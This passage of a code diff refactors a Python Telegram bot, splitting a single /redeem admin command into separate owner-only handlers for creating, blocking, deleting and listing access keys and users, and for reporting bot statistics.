-        key = args[1].upper().strip()
-        if delete_key(key):
-            await update.message.reply_text(f"✅ Key {key} deleted successfully!")
-        else:
-            await update.message.reply_text(f"❌ Key {key} not found!")
-    
-    elif action == 'block':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem block KEY123")
-            return
-        key = args[1].upper().strip()
-        if block_key(key):
-            await update.message.reply_text(f"✅ Key {key} blocked!")
-        else:
-            await update.message.reply_text(f"❌ Key {key} not found!")
-    
-    elif action == 'unblock':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem unblock KEY123")
-            return
-        key = args[1].upper().strip()
-        if unblock_key(key):
-            await update.message.reply_text(f"✅ Key {key} unblocked!")
-        else:
-            await update.message.reply_text(f"❌ Key {key} not found!")
-    
-    elif action == 'blockuser':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem blockuser 123456789")
-            return
-        try:
-            uid = int(args[1])
-            if block_user(uid):
-                await update.message.reply_text(f"✅ User {uid} blocked!")
-            else:
-                await update.message.reply_text(f"❌ User already blocked!")
-        except:
-            await update.message.reply_text("❌ Invalid user_id!")
-    
-    elif action == 'unblockuser':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem unblockuser 123456789")
-            return
-        try:
-            uid = int(args[1])
-            if unblock_user(uid):
-                await update.message.reply_text(f"✅ User {uid} unblocked!")
-            else:
-                await update.message.reply_text(f"❌ User not found in block list!")
-        except:
-            await update.message.reply_text("❌ Invalid user_id!")
-    
-    elif action == 'users':
-        db = load_db()
-        if not db['users']:
-            await update.message.reply_text("📭 No users found!")
-            return
-        text = "👥 All Users\n\n"
-        for uid, data in db['users'].items():
-            text += f"• User ID: {uid}\n"
-            text += f"  📊 Used: {data['used_count']} times\n"
-            text += f"  🔑 Keys: {len(data['keys'])}\n"
-        await update.message.reply_text(text)
-    
-    elif action == 'stats':
-        db = load_db()
-        total_users = len(db['users'])
-        total_keys = len(db['keys'])
-        active_keys = sum(1 for k in db['keys'].values() if k['active'])
-        blocked_users = len(db['blocked'])
-        premium_users = sum(1 for k in db['keys'].values() if k.get('is_premium', False))
-        
-        await update.message.reply_text(
-            f"📊 BOT STATISTICS\n\n"
-            f"👥 Users: {total_users}\n"
-            f"🔑 Total Keys: {total_keys}\n"
-            f"✅ Active Keys: {active_keys}\n"
-            f"⭐ Premium Keys: {premium_users}\n"
-            f"🚫 Blocked Users: {blocked_users}\n\n"
-            f"💀 @BeStChEaT_OwNeR"
-        )
-    
+    key = args[0].upper().strip()
+    if block_key(key):
+        await update.message.reply_text(f"✅ Key {key} blocked!")
     else:
-        await update.message.reply_text("❌ Invalid action! Use: create, createpremium, list, delete, block, unblock, blockuser, unblockuser, users, stats")
+        await update.message.reply_text(f"❌ Key {key} not found!")
+
+async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Unblock a key"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /unblock KEY")
+        return
+    
+    key = args[0].upper().strip()
+    if unblock_key(key):
+        await update.message.reply_text(f"✅ Key {key} unblocked!")
+    else:
+        await update.message.reply_text(f"❌ Key {key} not found!")
+
+async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Delete a key"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /delete KEY")
+        return
+    
+    key = args[0].upper().strip()
+    if delete_key(key):
+        await update.message.reply_text(f"✅ Key {key} deleted!")
+    else:
+        await update.message.reply_text(f"❌ Key {key} not found!")
+
+async def blockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Block a user"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /blockuser USER_ID")
+        return
+    
+    try:
+        uid = int(args[0])
+        if block_user(uid):
+            await update.message.reply_text(f"✅ User {uid} blocked!")
+        else:
+            await update.message.reply_text(f"❌ User already blocked!")
+    except:
+        await update.message.reply_text("❌ Invalid user_id!")
+
+async def unblockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Unblock a user"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /unblockuser USER_ID")
+        return
+    
+    try:
+        uid = int(args[0])
+        if unblock_user(uid):
+            await update.message.reply_text(f"✅ User {uid} unblocked!")
+        else:
+            await update.message.reply_text(f"❌ User not found in block list!")
+    except:
+        await update.message.reply_text("❌ Invalid user_id!")
+
+async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all users"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    db = load_db()
+    if not db['users']:
+        await update.message.reply_text("📭 No users found!")
+        return
+    
+    text = "👥 All Users\n\n"
+    for uid, data in db['users'].items():
+        text += f"• {uid} - {data['used_count']} uses\n"
+    
+    await update.message.reply_text(text)
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Bot statistics"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    db = load_db()
+    total_users = len(db['users'])
+    total_keys = len(db['keys'])
+    active_keys = sum(1 for k in db['keys'].values() if k['active'])
+    blocked_users = len(db['blocked'])
+    premium_keys = sum(1 for k in db['keys'].values() if k.get('is_premium', False))
+    
+    await update.message.reply_text(
+        f"📊 BOT STATISTICS\n\n"
+        f"👥 Users: {total_users}\n"
+        f"🔑 Total Keys: {total_keys}\n"
+        f"✅ Active Keys: {active_keys}\n"
+        f"⭐ Premium Keys: {premium_keys}\n"
+        f"🚫 Blocked Users: {blocked_users}\n\n"
+        f"💀 @BeStChEaT_OwNeR"
+    )
 
 # --- Main Bot ---
 
@@ -1006,11 +1123,25 @@ def main():
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
+    # User Commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("key", key_command))
-    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("commands", commands_list))
     app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("redeem", redeem_command))
+    
+    # Owner Commands (Short & Easy)
+    app.add_handler(CommandHandler("create", create_command))
+    app.add_handler(CommandHandler("createpremium", createpremium_command))
+    app.add_handler(CommandHandler("list", list_command))
+    app.add_handler(CommandHandler("block", block_command))
+    app.add_handler(CommandHandler("unblock", unblock_command))
+    app.add_handler(CommandHandler("delete", delete_command))
+    app.add_handler(CommandHandler("blockuser", blockuser_command))
+    app.add_handler(CommandHandler("unblockuser", unblockuser_command))
+    app.add_handler(CommandHandler("users", users_command))
+    app.add_handler(CommandHandler("stats", stats_command))
+    
+    # Message Handler
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(callback_handler))
     
